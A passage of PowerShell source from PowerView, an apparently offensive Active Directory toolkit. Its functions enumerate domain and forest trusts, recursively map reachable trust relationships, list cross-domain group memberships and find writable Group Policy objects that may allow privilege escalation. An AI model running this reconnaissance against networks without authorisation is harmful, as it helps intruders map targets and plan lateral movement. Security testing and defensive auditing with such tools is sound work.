        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # if we're searching for domain trusts through LDAP/ADSI
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    # $DomainTrust | Add-Member Noteproperty 'TargetGuid' "{$ObjectGuid}"
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # if we're searching for domain trusts through Win32 API functions
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                $TargetDC = $Null
            }

            # arguments for DsEnumerateDomainTrusts
            $PtrInfo = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            $Flags = 63
            $DomainCount = 0

            # get the trust information from the target server
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # Locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # if we're searching for domain trusts through .NET methods
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {
<#
.SYNOPSIS

Return all forest trusts for the current forest or a specified forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
forest using number of method using the .NET method GetAllTrustRelationships() on a
System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.

.PARAMETER Forest

Specifies the forest to query for trusts, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestTrust

Return current forest trusts.

.EXAMPLE

Get-ForestTrust -Forest "external.local"

Return trusts for the "external.local" forest.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestTrust -Forest "external.local" -Credential $Cred

Return trusts for the "external.local" forest using the specified alternate credenitals.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the user's domain.
This is a domain's "outgoing" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given user's domain name based on the user's distinguishedName.
This domain name is compared to the queried domain, and the user object is
output if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $UserDistinguishedName = $_.distinguishedname
                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $UserDomain) {
                        # if the group domain doesn't match the user domain, display it
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
<#
.SYNOPSIS

Enumerates groups with users outside of the group's domain and returns
each foreign member. This is a domain's "incoming" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the member's domain
name to the parent group's domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        # standard group names to ignore
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname
            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesn't end with the proper DN for the queried domain
                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                    $MemberDistinguishedName = $_
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
<#
.SYNOPSIS

This function enumerates all trusts for the current domain and then enumerates
all trusts for each domain it finds.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  

.DESCRIPTION

This function will enumerate domain trust relationships for the current domain using
a number of methods, and then enumerates all trusts for each found domain, recursively
mapping all reachable trust relationships. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead. If any 

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
built-in LDAP method.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -NET | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrustMapping -Server 'PRIMARY.testlab.local' | Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
using the specified alternate credentials, and output everything to a .csv file.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    # keep track of domains seen so we don't hit infinite recursion
    $SeenDomains = @{}

    # our domain status tracker
    $Domains = New-Object System.Collections.Stack

    $DomainTrustArguments = @{}
    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }

    # get the current domain and push it onto the stack
    if ($PSBoundParameters['Credential']) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # if we haven't seen this domain before
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

            # mark it as seen in our list
            $Null = $SeenDomains.Add($Domain, '')

            try {
                # get all the trusts for this domain
                $DomainTrustArguments['Domain'] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                # get any forest trusts, if they exist
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    # enumerate each trust found
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            # make sure we process the target
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function Get-GPODelegation {
<#
.SYNOPSIS

Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.

Author: Itamar Mizrahi (@MrAnde7son)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER GPOName

The GPO display name to query for, wildcards accepted.

.PARAMETER PageSize

Specifies the PageSize to set for the LDAP searcher object.

.EXAMPLE

Get-GPODelegation

Returns all GPO delegations in current forest.

.EXAMPLE

Get-GPODelegation -GPOName

Returns all GPO delegations on a given GPO.
#>

    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are executed, they are baked in
# and can't be changed while the script is running!
#
########################################################

$Mod = New-InMemoryModule -ModuleName Win32

